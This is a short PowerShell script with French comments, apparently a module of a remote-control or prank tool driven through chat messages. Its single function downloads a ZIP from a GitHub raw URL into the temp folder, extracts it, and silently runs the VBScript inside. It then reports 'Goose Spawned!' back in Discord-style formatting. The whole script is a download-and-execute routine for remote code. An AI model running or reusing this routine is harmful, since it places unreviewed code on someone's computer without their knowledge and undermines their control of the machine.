Function Goose {
    $url = "https://github.com/ertvg/h/raw/main/Goose.zip"
    $tempFolder = $env:TMP
    $zipFile = Join-Path -Path $tempFolder -ChildPath "Goose.zip"
    $extractPath = Join-Path -Path $tempFolder -ChildPath "Goose"
    
    # Téléchargement du fichier ZIP
    Invoke-WebRequest -Uri $url -OutFile $zipFile

    # Extraction de l'archive ZIP
    Expand-Archive -Path $zipFile -DestinationPath $extractPath -Force
    
    # Vérification de l'existence du fichier VBScript
    $vbscript = "$extractPath\Goose.vbs"
    If (Test-Path $vbscript) {
        & $vbscript
        sendMsg -Message ":white_check_mark: ``Goose Spawned!`` :white_check_mark:"
    } Else {
        Write-Host "Erreur : Le fichier VBScript n'a pas été trouvé."
    }
}

# Fonction sendMsg (si nécessaire)
Function sendMsg {
    param ($Message)
    Write-Host $Message
}
